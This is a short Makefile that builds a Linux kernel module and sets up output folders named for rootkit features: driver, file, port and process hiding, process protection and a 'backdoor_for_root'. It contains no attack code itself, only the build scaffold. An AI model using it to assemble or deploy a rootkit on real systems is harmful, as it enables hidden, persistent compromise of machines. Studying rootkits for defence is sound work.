BUILD_DIR = $(PWD)/output

$(BUILD_DIR):
	mkdir -p $(BUILD_DIR)
	touch $(BUILD_DIR)/Makefile
	mkdir -p $(BUILD_DIR)/driver_hiding
	mkdir -p $(BUILD_DIR)/file_hiding
	mkdir -p $(BUILD_DIR)/port_hiding
	mkdir -p $(BUILD_DIR)/process_hiding
	mkdir -p $(BUILD_DIR)/process_protection
	mkdir -p $(BUILD_DIR)/backdoor_for_root
lkm: $(BUILD_DIR)
	make -C /lib/modules/$(shell uname -r)/build M=$(BUILD_DIR) src=$(PWD)/lkm
clean:
	rm -rf $(BUILD_DIR)
